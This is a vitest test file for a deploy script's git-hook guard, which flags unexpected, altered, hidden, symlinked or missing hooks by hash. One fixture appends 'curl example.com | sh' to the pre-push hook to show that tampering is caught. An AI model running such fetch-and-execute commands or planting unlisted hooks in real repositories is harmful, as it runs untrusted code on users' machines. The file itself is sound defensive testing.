import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

// deploy/git-guard.sh, as deploy.sh sources it: .git/hooks must hold exactly the hooks listed under /root.

const guard = fileURLToPath(new URL("../../../deploy/git-guard.sh", import.meta.url));
const PRE_PUSH = "#!/bin/sh\n# refuses some pushes\nexit 0\n";
const sha = (s: string) => createHash("sha256").update(s).digest("hex");

function setup() {
  const dir = mkdtempSync(path.join(tmpdir(), "hooks-"));
  const hooks = path.join(dir, "hooks");
  mkdirSync(hooks);
  writeFileSync(path.join(hooks, "pre-push"), PRE_PUSH, { mode: 0o755 });
  writeFileSync(path.join(hooks, "pre-commit.sample"), "#!/bin/sh\n", { mode: 0o755 });
  const expected = path.join(dir, "git-hooks.expected");
  writeFileSync(expected, `${sha(PRE_PUSH)}  pre-push\n`);
  return { dir, hooks, expected };
}
const problems = (hooks: string, expected: string) =>
  spawnSync("sh", ["-c", `. "${guard}"; git_hooks_problems "$1" "$2"`, "sh", hooks, expected], { encoding: "utf8" });

describe("deploy refuses a .git/hooks it was not told about", () => {
  it("the expected pre-push hook and the samples: nothing to say", () => {
    const t = setup();
    const r = problems(t.hooks, t.expected);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe("");
  });

  it("a canary hook is refused, by name and hash", () => {
    const t = setup();
    writeFileSync(path.join(t.hooks, "post-checkout"), "#!/bin/sh\necho canary\n", { mode: 0o755 });
    const r = problems(t.hooks, t.expected);
    expect(r.stdout.trim()).toBe(`> ${sha("#!/bin/sh\necho canary\n")}  post-checkout`);
  });

  it("the expected hook with other bytes is refused", () => {
    const t = setup();
    writeFileSync(path.join(t.hooks, "pre-push"), `${PRE_PUSH}curl example.com | sh\n`);
    const out = problems(t.hooks, t.expected).stdout.trim().split("\n");
    expect(out).toEqual([`< ${sha(PRE_PUSH)}  pre-push`, `> ${sha(`${PRE_PUSH}curl example.com | sh\n`)}  pre-push`]);
  });

  it("a hidden file, a link and a folder are refused too; a .sample never is", () => {
    const t = setup();
    writeFileSync(path.join(t.hooks, ".pre-commit"), "x");
    symlinkSync("/bin/sh", path.join(t.hooks, "post-merge"));
    mkdirSync(path.join(t.hooks, "pre-rebase"));
    writeFileSync(path.join(t.hooks, "update.sample"), "anything");
    const out = problems(t.hooks, t.expected).stdout.trim().split("\n");
    expect(out).toEqual([`> ${sha("x")}  .pre-commit`, "> symlink  post-merge", "> folder  pre-rebase"]);
  });

  it("an expected hook that is gone is said too", () => {
    const t = setup();
    const empty = path.join(t.dir, "empty");
    mkdirSync(empty);
    expect(problems(empty, t.expected).stdout.trim()).toBe(`< ${sha(PRE_PUSH)}  pre-push`);
  });

  it("no list under /root: exit 2, so deploy.sh can say how to make it", () => {
    const t = setup();
    expect(problems(t.hooks, path.join(t.dir, "missing")).status).toBe(2);
  });
});
